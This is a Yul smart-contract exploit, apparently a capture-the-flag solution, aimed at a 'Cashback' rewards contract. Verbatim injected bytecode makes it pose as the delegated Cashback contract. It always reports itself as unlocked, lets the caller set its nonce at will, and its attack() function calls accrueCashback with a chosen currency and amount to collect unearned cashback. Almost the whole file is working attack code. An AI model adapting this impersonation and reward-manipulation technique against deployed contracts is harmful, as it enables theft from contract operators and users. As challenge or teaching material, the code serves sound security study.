object "InjectedCashbackAttack" {
    code {
        let runtimeSize := datasize("runtime")
        datacopy(0, dataoffset("runtime"), runtimeSize)
        return (0x00, runtimeSize)
    }

    object "runtime" {
        code {
            // Code we want to inject to masquerade as the deletegated contract
            // Cashback contract addr: 0xdCc409Af2566c47F6DA4d30Eae8155b332A64078
            verbatim_0i_0o(hex"603056dCc409Af2566c47F6DA4d30Eae8155b332A64078000000000000000000000000000000000000000000000000005B")

            // protection against sending Ether
            require(iszero(callvalue()))

            // dispatchers
            switch selector()
            case 0x3c5ab959 { // attack(address, address, address, uint256)
                let cashbackAddr := decodeAsAddr(0)
                let player := decodeAsAddr(1)
                let currency := decodeAsAddr(2)
                let amount := decodeAsUint(3)

                // free memory pointer
                let ptr := mload(0x40)

                // 1. function selector
                let sel := mload(dataoffset("accrueCashbackSel"))
                mstore(ptr, shl(224, sel)) // left-shift (256 - 32) bits
                mstore(add(ptr, 4), currency)
                mstore(add(ptr, 36), amount)

                // total calldata size = 4 (selector) + 32 bytes (addr) + 32 bytes (uint256) = 68
                let success := call(
                    gas(),
                    cashbackAddr,
                    0,      // no ETH
                    ptr,    // calldata start
                    68,     // calldata size
                    0,      // output buffer
                    0       // output length
                )

                require(success)
            }
            case 0x8380edb7 { // isUnlocked()
                returnTrue()
            }
            case 0xf360c183 { // setNonce(uint256)
                setNonce(decodeAsUint(0))
            }
            case 0x34b15118 { // consumeNonce()
                returnUint(nonce())
            }
            default {
                revert(0, 0)
            }

            /* ------- calldata decoding functions ------- */
            function selector() -> s {
                s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)
            }

            function decodeAsUint(offset) -> v {
                let pos := add(4, mul(offset, 0x20))
                if lt(calldatasize(), add(pos, 0x20)) {
                    revert(0,0)
                }
                v := calldataload(pos)
            }

            function decodeAsAddr(offset) -> v {
                v := decodeAsUint(offset)
                if iszero(iszero(and(v, not(0xffffffffffffffffffffffffffffffffffffffff)))) {
                    revert(0, 0)
                }
            }

            /* ------- calldata encoding functions ------- */
            function returnUint(v) {
                mstore(0, v)
                return (0, 0x20)
            }

            function returnTrue() {
                returnUint(1)
            }

            /* ------- storage layout ------- */
            function noncePos() -> p {
                p := 0
            }

            /* ------- storage access ------- */
            function nonce() -> n {
                n := sload(noncePos())
            }

            function setNonce(n) {
                sstore(noncePos(), n)
            }

            /* ------- utility functions ------- */
            function getNativeAmt() -> v {
                let max := mload(dataoffset("NATIVE_MAX_CASHBACK"))
                let rate := mload(dataoffset("NATIVE_CASHBACK_RATE"))
                let bp := mload(dataoffset("BASIS_POINT"))
                v := div(mul(max, rate), bp)
            }

            function require(condition) {
                if iszero(condition) { revert(0, 0) }
            }
        } // end of code

        // constant used
        data "BASIS_POINT"          hex"2710"

        data "NATIVE_MAX_CASHBACK"  hex"0de0b6b3a7640000"
        data "NATIVE_CASHBACK_RATE" hex"32"

        data "FREEDOM_MAX_CASHBACK" hex"1b1ae4d6e2ef500000"
        data "FREEDOM_CASHBACK_RATE" hex"c8"

        data "NativeCurrency"       hex"EeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
        data "FreedomCoin"          hex"13aaf3218facf57cfbf5925e15433307b59bcc37"

        data "accrueCashbackSel"    hex"ebc39613"
    }
}
